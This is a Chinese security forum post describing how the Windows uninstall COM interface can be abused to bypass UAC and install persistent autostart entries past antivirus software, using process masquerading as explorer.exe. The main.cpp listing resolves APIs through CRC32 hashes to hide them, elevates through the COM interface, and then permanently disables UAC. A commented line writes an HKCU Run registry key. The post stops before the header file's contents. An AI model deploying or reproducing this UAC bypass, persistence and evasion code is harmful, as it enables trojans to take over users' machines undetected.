
# [原创]关于卸载COM的利用

关于卸载COM的利用起始是通过这个于16年的帖子

8d9K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3k6J5k6h3g2T1N6h3k6Q4x3X3g2U0L8$3#2Q4x3V1k6S2M7Y4c8A6j5$3I4W2M7#2)9J5c8Y4y4&6M7%4c8W2L8g2)9J5c8U0p5I4y4U0j5I4x3g2)9J5k6h3S2@1L8h3H3`.

文中提到如何通过卸载COM突破UAC。

而后本人通过一系列测试发现，在卸载项上写入`cmd`命令，通过`cmd`命令添加自定义文件开机自启动，或者通过`regedit`命令添加写有`RUN`键注册表`reg`文件也能执行命令，主要效果在于突破安防软件添加开机自启动（包括现今依旧可以，关键在于该利用比较简单，兼容全系统）。

开机自启向来是一般木马核心点，故而这里存在很大安全隐患。

利用卸载com最关键起始`exe`需要是白文件，而文中介绍使用`rundll32`使系统受信无提示调用。其实直接使用白加黑也能达到效果。

其中问题，`rundll32`在系统下受信，可能现在在安防软件中不再受信。而白加黑需要有两个文件。故而还有一种方式。

该方式为伪装自身进程为`explorer.exe`（并非修改文件名为

`explorer.exe`，直接伪造自身进程就好）。此法也能完美使用卸载COM执行需要的操作。并且好处是单文件。

在后来一些木马样本中，也发现过使用卸载COM进行一些操作的。

关于该COM的利用在WIN10大概8月份更新中似乎也有一些修复。不过其中依旧有可利用点。

在后面的研究中发现部分木马利用模拟点击方式去绕过。

这里我给出的是其中伪造进程的方式。

单文件使用卸载COM来ByUAC，并永久关闭系统UAC，可在杀软下测试使用。中间添加卸载项时候可能有绿标，这里各位大佬八仙过海了。

## main.cpp

```
#include"UninstallCom.h"

 

int main(int argc, char* argv[])

{

    TCHAR chpath[MAX_PATH] = { 0 };

    GetModuleFileName(NULL, chpath, sizeof(chpath));

    //TCHAR szCommand[MAX_PATH] = L"cmd.exe";

    //wsprintfW(szCommand, L"reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run  /v test /t reg_sz /d \"%s\"", chpath);

 

    //BYUAC自身后永久关闭UAC

    if (!IsProcessRunAsAdmin())

    {

        HINSTANCE naddr;

        naddr = GetAddr();

 

        if (!naddr)exit(0);

 

        fun1 = (PFUN1)GetAPI_FROM_CRC32(naddr, 0x3035d02a);

        fun2 = (LPFUN2)GetAPI_FROM_CRC32(naddr, 0x63d61209);

        fun3 = (LPFUN3)GetAPI_FROM_CRC32(naddr, 0xc1a71f6f);

        fun4 = (LPFUN4)GetAPI_FROM_CRC32(naddr, 0x6f1b1807);

        fun5 = (LPFUN5)GetAPI_FROM_CRC32(naddr, 0xd33bcabd);

        if (!fun5 || !fun1 || !fun2 || !fun3 || !fun4)

            exit(0);

 

        mainfun();

 

        IARPUninstall(chpath, (wchar_t*)L"SystemSafeREG");

    }

    else

    {

        MessageBox(0, 0, 0, 0);

        CloseUAC();

    }

    return 0;

}
```

## UninstallCom.h
